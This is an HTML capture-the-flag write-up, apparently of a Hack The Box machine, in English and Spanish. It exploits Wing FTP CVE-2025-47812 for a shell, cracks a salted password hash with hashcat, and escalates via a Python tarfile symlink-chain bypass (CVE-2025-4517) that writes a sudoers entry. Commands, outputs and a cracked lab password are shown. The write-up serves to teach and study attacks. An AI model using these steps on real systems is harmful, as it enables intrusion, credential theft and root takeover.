@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>wingdata | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">wingdata</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===================== ENGLISH ===================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The target machine was running Wing FTP Server v7.4.3 on the virtual host
+                        <code>ftp.wingdata.htb</code>, which is vulnerable to <strong>CVE-2025-47812</strong>, an
+                        unauthenticated remote code execution vulnerability. By exploiting this CVE with a public
+                        proof-of-concept, I gained a shell as the <code>wingftp</code> system user.</p>
+
+                    <p>Inside the Wing FTP installation directory, I found salted SHA-256 password hashes for the
+                        <code>wacky</code> user. After identifying the salt string used (<code>WingFTP</code>) from the
+                        service configuration files, I cracked the hash with Hashcat in mode 1410 and pivoted to
+                        <code>wacky</code>, obtaining the user flag.</p>
+
+                    <p>Privilege escalation was achieved through a Python <code>tarfile</code> arbitrary file write
+                        vulnerability, <strong>CVE-2025-4517</strong>. The <code>wacky</code> user could run a backup
+                        restore script as root via <code>sudo</code>, which used <code>tarfile.extractall()</code> with
+                        <code>filter="data"</code>. By crafting a malicious tarball that chains symlinks exceeding the
+                        kernel's <code>MAX_PATH</code> limit, I bypassed the filter validation and wrote an arbitrary
+                        file to <code>/etc/sudoers.d/wacky</code>, granting full <code>sudo</code> access and thus root.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Wing FTP Server unauthenticated RCE (CVE-2025-47812),
+                        Hashcat salted SHA-256 cracking (mode 1410), Python tarfile arbitrary file write via symlink
+                        chain bypass (CVE-2025-4517).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an Nmap scan to identify open ports and services on the target:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">22</span><span style="color:#abb2bf;">/tcp open  </span><span style="color:#98c379;">ssh</span><span style="color:#abb2bf;">     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey:
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+</span><span style="color:#e06c75;">80</span><span style="color:#abb2bf;">/tcp open  </span><span style="color:#98c379;">http</span><span style="color:#abb2bf;">    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>The scan reveals two services: SSH on port 22 and an Apache HTTP server on port 80 that redirects to
+                    <code>wingdata.htb</code>. I add the hostname to <code>/etc/hosts</code> and browse to the site.</p>
+
+                <h2>Web Enumeration — Wing FTP Server</h2>
+                <p>The main website is fairly simple. The most interesting element is a <strong>"Client Portal"</strong>
+                    button that redirects to the virtual host <code>ftp.wingdata.htb</code>, which I also add to
+                    <code>/etc/hosts</code>.</p>
+
+                <p><img src="./media/image1.png" alt="Wing FTP Server login page at ftp.wingdata.htb showing the version number v7.4.3 in the footer" /></p>
+
+                <p>This virtual host presents a login page for <strong>Wing FTP Server v7.4.3</strong>, with the
+                    version clearly displayed in the footer.</p>
+
+                <h2>Vulnerability Research — CVE-2025-47812</h2>
+                <p>A quick search for Wing FTP Server v7.4.3 immediately surfaces a critical vulnerability:
+                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812">CVE-2025-47812</a>, an
+                    <strong>unauthenticated remote code execution</strong> vulnerability. There is also a ready-to-use
+                    public exploit on Exploit-DB:
+                    <a href="https://www.exploit-db.com/exploits/52347">https://www.exploit-db.com/exploits/52347</a>.</p>
+
+                <h2>Initial Access — Exploiting CVE-2025-47812</h2>
+                <p>I test the exploit with a simple <code>id</code> command to confirm execution:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span><span style="color:#abb2bf;"> cve.py </span><span style="color:#e06c75;">-u</span><span style="color:#abb2bf;"> http://ftp.wingdata.htb </span><span style="color:#e06c75;">-c</span><span style="color:#abb2bf;"> id</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">[*]</span><span style="color:#abb2bf;"> Testing target: http://ftp.wingdata.htb
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> UID extracted: 6e2ad080c603b7df1394e16b1c304f4af528764d624db129b32c21fbca0cb8d6
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 6e2ad080c603b7df1394e16b1c304f4af528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+----------------------</span></code></pre>
+
+                <p>Code execution is confirmed. Passing a raw reverse shell payload directly doesn't work, but the
+                    classic trick of hosting the shell code on a Python HTTP server and piping it to <code>bash</code>
+                    does the job cleanly. I obtain a shell as the <code>wingftp</code> user.</p>
+
+                <h2>Lateral Movement — Cracking the Wing FTP Password Hash</h2>
+                <p>Enumerating <code>/home</code> reveals another user: <code>wacky</code>. Looking inside the Wing FTP
+                    installation at <code>/opt/wftpserver/Data/1/users/</code>, I find per-user XML configuration files
+                    that store password hashes:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span><span style="color:#abb2bf;"> /opt/wftpserver/Data/1/users/wacky.xml | </span><span style="color:#61afef;">grep</span><span style="color:#abb2bf;"> Pass</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;EnablePassword&gt;</span><span style="color:#abb2bf;">1</span><span style="color:#e06c75;">&lt;/EnablePassword&gt;</span>
+<span style="color:#e06c75;">&lt;Password&gt;</span><span style="color:#abb2bf;">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</span><span style="color:#e06c75;">&lt;/Password&gt;</span></code></pre>
+
+                <p>The hash alone doesn't crack with rockyou.txt. Digging into the service settings reveals that since
+                    Wing FTP version 7, password salting was introduced. The salt string is stored in
+                    <code>settings.xml</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span><span style="color:#abb2bf;"> /opt/wftpserver/Data/1/settings.xml | </span><span style="color:#61afef;">grep</span><span style="color:#abb2bf;"> Salt</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;EnablePasswordSalting&gt;</span><span style="color:#abb2bf;">1</span><span style="color:#e06c75;">&lt;/EnablePasswordSalting&gt;</span>
+<span style="color:#e06c75;">&lt;SaltingString&gt;</span><span style="color:#98c379;">WingFTP</span><span style="color:#e06c75;">&lt;/SaltingString&gt;</span></code></pre>
+
+                <p>The hash format is <code>SHA256(password:salt)</code>, which corresponds to Hashcat mode
+                    <code>1410</code> (<code>sha256($pass.$salt)</code>). I prepare the hash file in the format
+                    <code>hash:salt</code> and run Hashcat:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">hashcat</span><span style="color:#abb2bf;"> </span><span style="color:#e06c75;">-m</span><span style="color:#abb2bf;"> 1410 hashes.txt /usr/share/wordlists/rockyou.txt</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:</span><span style="color:#e5c07b;">!#7Blushing^*Bride5</span></code></pre>
+
+                <p>The hash cracks quickly. Using these credentials I switch to the <code>wacky</code> user and
+                    retrieve the user flag.</p>
+
+                <h2>Privilege Escalation — Python tarfile Arbitrary File Write (CVE-2025-4517)</h2>
+
+                <h3>Analysing the sudo Permission</h3>
+                <p>Checking <code>wacky</code>'s sudo rights:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> -l</span></code></pre>
+
+                <pre><code class="language-plaintext">User wacky may run the following commands on wingdata:
+    <span style="color:#98c379;">(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span></code></pre>
+
+                <p>The <code>wacky</code> user can run a specific Python backup restore script as root. Let's read it:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+<span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> tarfile
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> os
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> sys
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> re
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> argparse
+
+BACKUP_BASE_DIR </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"/opt/backup_clients/backups"</span>
+<span style="color:#abb2bf;">STAGING_BASE </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"/opt/backup_clients/restored_backups"</span>
+
+<span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">validate_backup_name</span><span style="color:#abb2bf;">(filename):
+    </span><span style="color:#c678dd;">if not</span><span style="color:#abb2bf;"> re.fullmatch(</span><span style="color:#98c379;">r"^backup_\d+\.tar$"</span><span style="color:#abb2bf;">, filename):
+        </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> </span><span style="color:#e5c07b;">False</span>
+<span style="color:#abb2bf;">    client_id </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> filename.split(</span><span style="color:#98c379;">'_'</span><span style="color:#abb2bf;">)[</span><span style="color:#d19a66;">1</span><span style="color:#abb2bf;">].rstrip(</span><span style="color:#98c379;">'.tar'</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> client_id.isdigit() </span><span style="color:#c678dd;">and</span><span style="color:#abb2bf;"> client_id </span><span style="color:#56b6c2;">!=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"0"</span>
+
+<span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">validate_restore_tag</span><span style="color:#abb2bf;">(tag):
+    </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">bool</span><span style="color:#abb2bf;">(re.fullmatch(</span><span style="color:#98c379;">r"^[a-zA-Z0-9_]{1,24}$"</span><span style="color:#abb2bf;">, tag))
+
+</span><span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">main</span><span style="color:#abb2bf;">():
+    </span><span style="color:#c678dd;">...</span>
+<span style="color:#abb2bf;">    staging_dir </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> os.path.join(STAGING_BASE, args.restore_dir)
+    os.makedirs(staging_dir, exist_ok</span><span style="color:#56b6c2;">=</span><span style="color:#e5c07b;">True</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">try</span><span style="color:#abb2bf;">:
+        </span><span style="color:#c678dd;">with</span><span style="color:#abb2bf;"> tarfile.open(backup_path, </span><span style="color:#98c379;">"r"</span><span style="color:#abb2bf;">) </span><span style="color:#c678dd;">as</span><span style="color:#abb2bf;"> tar:
+            tar.extractall(path</span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;">staging_dir, filter</span><span style="color:#56b6c2;">=</span><span style="color:#98c379;">"data"</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">except</span><span style="color:#abb2bf;"> (tarfile.TarError, OSError, Exception) </span><span style="color:#c678dd;">as</span><span style="color:#abb2bf;"> e:
+        </span><span style="color:#61afef;">print</span><span style="color:#abb2bf;">(</span><span style="color:#98c379;">f"[!] Error during extraction: </span><span style="color:#56b6c2;">{e}</span><span style="color:#98c379;">"</span><span style="color:#abb2bf;">, file</span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;">sys.stderr)
+        sys.exit(</span><span style="color:#d19a66;">2</span><span style="color:#abb2bf;">)</span></code></pre>
+
+                <p>The script accepts a <code>-b</code> (backup filename) and a <code>-r</code> (restore directory
+                    name) argument, validates both with regex, and then calls
+                    <code>tarfile.extractall(path=staging_dir, filter="data")</code>. The key constraint is write access:
+                    I cannot write to <code>/opt/backup_clients/</code> itself, but I <em>do</em> have write access to
+                    <code>/opt/backup_clients/backups/</code>, where the tarballs are read from.</p>
+
+                <h3>Why Symlink Attacks Are Blocked by <code>filter="data"</code></h3>
+                <p>The first idea is to craft a tarball containing symlinks pointing outside the extraction directory.
+                    For example:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span><span style="color:#abb2bf;"> -s ../../../../../../../etc/shadow shadow_relative
+</span><span style="color:#61afef;">ln</span><span style="color:#abb2bf;"> -s /etc/shadow shadow_absolute
+</span><span style="color:#61afef;">tar</span><span style="color:#abb2bf;"> -cf backup_1.tar shadow_relative
+</span><span style="color:#61afef;">tar</span><span style="color:#abb2bf;"> -cf backup_2.tar shadow_absolute</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">[!] Error during extraction: 'shadow_relative' would link to '/etc/shadow', which is outside the destination
+[!] Error during extraction: 'shadow_absolute' is a link to an absolute path</span></code></pre>
+
+                <p>Both attempts are blocked. This is expected behaviour of <code>filter="data"</code>, documented in
+                    <a href="https://peps.python.org/pep-0706/#filters">PEP 706</a>:</p>
+
+                <blockquote>
+                    <p>"Refuse to extract links (hard or soft) that link to absolute paths. Refuse to extract links
+                        (hard or soft) which end up linking to a path outside of the destination."</p>
+                </blockquote>
+
+                <p>No other obvious injection vector exists in the script, so the focus shifts to finding a CVE in the
+                    <code>tarfile</code> library itself.</p>
+
+                <h3>Finding the Right CVE</h3>
+                <p>Checking the Python version:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span><span style="color:#abb2bf;"> --version</span></code></pre>
+
+                <pre><code class="language-plaintext">Python 3.12.3</code></pre>
+
+                <p>My first finding is
+                    <a href="https://github.com/advisories/GHSA-2pg8-h2j6-28xm">CVE-2024-12718</a>, but that only
+                    provides a useful primitive when <code>filter="tar"</code> is used. With <code>filter="data"</code>
+                    the impact is limited to metadata changes, which isn't useful here.</p>
+
+                <p>Searching further, I find a more recent vulnerability:
+                    <a href="https://github.com/advisories/GHSA-6r6c-684h-9j7p">CVE-2025-4517</a>, and a Google
+                    Security Research advisory with a working PoC:
+                    <a href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">GHSA-hgqp-3mmf-7h8f</a>.
+                    This one allows <strong>arbitrary file writes</strong> even with <code>filter="data"</code>.</p>
+
+                <h3>Understanding CVE-2025-4517</h3>
+                <p>The vulnerability is rooted in how <code>filter="data"</code> validates symlink chains against the
+                    kernel's <code>MAX_PATH</code> (4096 characters on Linux). The filter calls
+                    <code>os.path.realpath()</code> to resolve the full chain, but <code>realpath()</code> silently
+                    truncates resolution once it hits <code>MAX_PATH</code> — it stops following links and returns an
+                    incomplete, inaccurate path. The filter then sees a path that appears to land within the staging
+                    directory and considers it safe.</p>
+
+                <p>The attack works by chaining multiple symlinks, each with a long target path (~247 chars), across
+                    approximately 16 levels totalling ~3952 characters. The structure looks like:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">a</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+└─ </span><span style="color:#61afef;">b</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+   └─ </span><span style="color:#61afef;">c</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+      └─ </span><span style="color:#61afef;">...</span><span style="color:#abb2bf;"> (16 levels, ~3952 chars total)
+         └─ </span><span style="color:#e06c75;">final</span><span style="color:#abb2bf;"> → /etc/sudoers.d/wacky (target privileged file)</span></code></pre>
+
+                <p>When the filter resolves the chain with <code>os.path.realpath()</code>, it exhausts
+                    <code>MAX_PATH</code> partway through and stops — never reaching the actual target. It considers
+                    the path valid and extraction proceeds. At runtime, the kernel then follows the full, real symlink
+                    chain and writes to the privileged file.</p>
+
+                <h3>Building and Executing the Exploit</h3>
+                <p>Based on the public PoC, I craft a Python script (assisted by Claude) that generates a malicious
+                    tarball. The final symlink in the chain resolves to <code>/etc/sudoers.d/wacky</code>, and the
+                    file content is:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">wacky ALL=(ALL) NOPASSWD: ALL</span></code></pre>
+
+                <p>I place the resulting <code>backup_1.tar</code> into <code>/opt/backup_clients/backups/</code> and
+                    invoke the script:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py </span><span style="color:#e06c75;">-b</span><span style="color:#abb2bf;"> backup_1.tar </span><span style="color:#e06c75;">-r</span><span style="color:#abb2bf;"> restore_asd</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Backup: backup_1.tar
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Staging directory: /opt/backup_clients/restored_backups/restore_asd
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Extraction completed in /opt/backup_clients/restored_backups/restore_asd</span></code></pre>
+
+                <p>Success — no errors. Verifying the result:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> -l</span></code></pre>
+
+                <pre><code class="language-plaintext">User wacky may run the following commands on wingdata:
+    <span style="color:#abb2bf;">(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span>
+    <span style="color:#98c379;">(ALL) NOPASSWD: ALL</span></code></pre>
+
+                <p>The sudoers entry was written successfully. With unrestricted <code>sudo</code> access I escalate
+                    to root and retrieve the system flag:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> su</span></code></pre>
+            </div>
+
+            <!-- ===================== ESPAÑOL ===================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>La máquina objetivo ejecutaba Wing FTP Server v7.4.3 en el virtual host
+                        <code>ftp.wingdata.htb</code>, vulnerable a <strong>CVE-2025-47812</strong>, una vulnerabilidad
+                        de ejecución remota de código sin autenticación. Explotando este CVE con una prueba de concepto
+                        pública, conseguí una shell como el usuario de sistema <code>wingftp</code>.</p>
+
+                    <p>Dentro del directorio de instalación de Wing FTP encontré hashes de contraseña con sal del
+                        usuario <code>wacky</code>. Tras identificar el string de sal utilizado (<code>WingFTP</code>)
+                        en los archivos de configuración del servicio, crackeé el hash con Hashcat en modo 1410 y
+                        pivoté al usuario <code>wacky</code>, obteniendo la flag de usuario.</p>
+
+                    <p>La escalada de privilegios se consiguió mediante una vulnerabilidad de escritura arbitraria de
+                        archivos en la librería <code>tarfile</code> de Python, <strong>CVE-2025-4517</strong>. El
+                        usuario <code>wacky</code> podía ejecutar un script de restauración de backups como root
+                        mediante <code>sudo</code>, que usaba <code>tarfile.extractall()</code> con
+                        <code>filter="data"</code>. Fabricando un tarball malicioso que encadena symlinks superando el
+                        límite <code>MAX_PATH</code> del kernel, eludí la validación del filtro y escribí un archivo
+                        arbitrario en <code>/etc/sudoers.d/wacky</code>, obteniendo acceso <code>sudo</code> completo
+                        y por tanto root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Wing FTP Server RCE sin autenticación (CVE-2025-47812),
+                        crackeo de SHA-256 con sal en Hashcat (modo 1410), escritura arbitraria de archivos en
+                        tarfile de Python mediante bypass de cadena de symlinks (CVE-2025-4517).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de Nmap para identificar los puertos abiertos y los servicios que se
+                    ejecutan en el objetivo:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">22</span><span style="color:#abb2bf;">/tcp open  </span><span style="color:#98c379;">ssh</span><span style="color:#abb2bf;">     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey:
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+</span><span style="color:#e06c75;">80</span><span style="color:#abb2bf;">/tcp open  </span><span style="color:#98c379;">http</span><span style="color:#abb2bf;">    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>El escaneo revela dos servicios: SSH en el puerto 22 y un servidor Apache HTTP en el puerto 80 que
+                    redirige a <code>wingdata.htb</code>. Añado el hostname a <code>/etc/hosts</code> y navego hasta
+                    el sitio.</p>
+
+                <h2>Enumeración Web — Wing FTP Server</h2>
+                <p>La web principal es bastante sencilla. Lo más interesante es un botón
+                    <strong>"Client Portal"</strong> que redirige al virtual host <code>ftp.wingdata.htb</code>, que
+                    también añado a <code>/etc/hosts</code>.</p>
+
+                <p><img src="./media/image1.png" alt="Página de login de Wing FTP Server en ftp.wingdata.htb mostrando el número de versión v7.4.3 en el pie de página" /></p>
+
+                <p>Este virtual host presenta una página de login de <strong>Wing FTP Server v7.4.3</strong>, con la
+                    versión visible en el footer.</p>
+
+                <h2>Investigación de Vulnerabilidades — CVE-2025-47812</h2>
+                <p>Una búsqueda rápida sobre Wing FTP Server v7.4.3 encuentra inmediatamente una vulnerabilidad
+                    crítica: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812">CVE-2025-47812</a>, una
+                    vulnerabilidad de <strong>ejecución remota de código sin autenticación</strong>. Existe además un
+                    exploit público listo para usar en Exploit-DB:
+                    <a href="https://www.exploit-db.com/exploits/52347">https://www.exploit-db.com/exploits/52347</a>.</p>
+
+                <h2>Acceso Inicial — Explotando CVE-2025-47812</h2>
+                <p>Pruebo el exploit con un comando <code>id</code> sencillo para confirmar la ejecución:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span><span style="color:#abb2bf;"> cve.py </span><span style="color:#e06c75;">-u</span><span style="color:#abb2bf;"> http://ftp.wingdata.htb </span><span style="color:#e06c75;">-c</span><span style="color:#abb2bf;"> id</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">[*]</span><span style="color:#abb2bf;"> Testing target: http://ftp.wingdata.htb
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> UID extracted: 6e2ad080c603b7df1394e16b1c304f4af528764d624db129b32c21fbca0cb8d6
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 6e2ad080c603b7df1394e16b1c304f4af528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+----------------------</span></code></pre>
+
+                <p>La ejecución de código queda confirmada. Pasar directamente el payload de una reverse shell no
+                    funciona, pero el truco clásico de servir el código de la shell mediante un servidor HTTP de Python
+                    y pipearlo a <code>bash</code> funciona sin problemas. Obtengo una shell como el usuario
+                    <code>wingftp</code>.</p>
+
+                <h2>Movimiento Lateral — Crackeando el Hash de Contraseña de Wing FTP</h2>
+                <p>Enumerando <code>/home</code> veo otro usuario: <code>wacky</code>. Mirando dentro de la
+                    instalación de Wing FTP en <code>/opt/wftpserver/Data/1/users/</code>, encuentro archivos XML de
+                    configuración por usuario que almacenan los hashes de contraseñas:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span><span style="color:#abb2bf;"> /opt/wftpserver/Data/1/users/wacky.xml | </span><span style="color:#61afef;">grep</span><span style="color:#abb2bf;"> Pass</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;EnablePassword&gt;</span><span style="color:#abb2bf;">1</span><span style="color:#e06c75;">&lt;/EnablePassword&gt;</span>
+<span style="color:#e06c75;">&lt;Password&gt;</span><span style="color:#abb2bf;">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</span><span style="color:#e06c75;">&lt;/Password&gt;</span></code></pre>
+
+                <p>El hash solo no crackea con rockyou.txt. Investigando la configuración del servicio veo que desde
+                    Wing FTP versión 7 se introdujo el salting de contraseñas. El string de sal se almacena en
+                    <code>settings.xml</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">cat</span><span style="color:#abb2bf;"> /opt/wftpserver/Data/1/settings.xml | </span><span style="color:#61afef;">grep</span><span style="color:#abb2bf;"> Salt</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;EnablePasswordSalting&gt;</span><span style="color:#abb2bf;">1</span><span style="color:#e06c75;">&lt;/EnablePasswordSalting&gt;</span>
+<span style="color:#e06c75;">&lt;SaltingString&gt;</span><span style="color:#98c379;">WingFTP</span><span style="color:#e06c75;">&lt;/SaltingString&gt;</span></code></pre>
+
+                <p>El formato del hash es <code>SHA256(contraseña:sal)</code>, que corresponde al modo
+                    <code>1410</code> de Hashcat (<code>sha256($pass.$salt)</code>). Preparo el archivo de hashes en
+                    formato <code>hash:salt</code> y lanzo Hashcat:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">hashcat</span><span style="color:#abb2bf;"> </span><span style="color:#e06c75;">-m</span><span style="color:#abb2bf;"> 1410 hashes.txt /usr/share/wordlists/rockyou.txt</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:</span><span style="color:#e5c07b;">!#7Blushing^*Bride5</span></code></pre>
+
+                <p>El hash crackea rápido. Usando estas credenciales cambio al usuario <code>wacky</code> y consigo
+                    la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios — Escritura Arbitraria de Archivos en tarfile de Python (CVE-2025-4517)</h2>
+
+                <h3>Analizando el Permiso sudo</h3>
+                <p>Compruebo los permisos sudo de <code>wacky</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> -l</span></code></pre>
+
+                <pre><code class="language-plaintext">User wacky may run the following commands on wingdata:
+    <span style="color:#98c379;">(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span></code></pre>
+
+                <p>El usuario <code>wacky</code> puede ejecutar como root un script Python específico de restauración
+                    de backups. Lo leo:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+<span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> tarfile
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> os
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> sys
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> re
+</span><span style="color:#c678dd;">import</span><span style="color:#abb2bf;"> argparse
+
+BACKUP_BASE_DIR </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"/opt/backup_clients/backups"</span>
+<span style="color:#abb2bf;">STAGING_BASE </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"/opt/backup_clients/restored_backups"</span>
+
+<span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">validate_backup_name</span><span style="color:#abb2bf;">(filename):
+    </span><span style="color:#c678dd;">if not</span><span style="color:#abb2bf;"> re.fullmatch(</span><span style="color:#98c379;">r"^backup_\d+\.tar$"</span><span style="color:#abb2bf;">, filename):
+        </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> </span><span style="color:#e5c07b;">False</span>
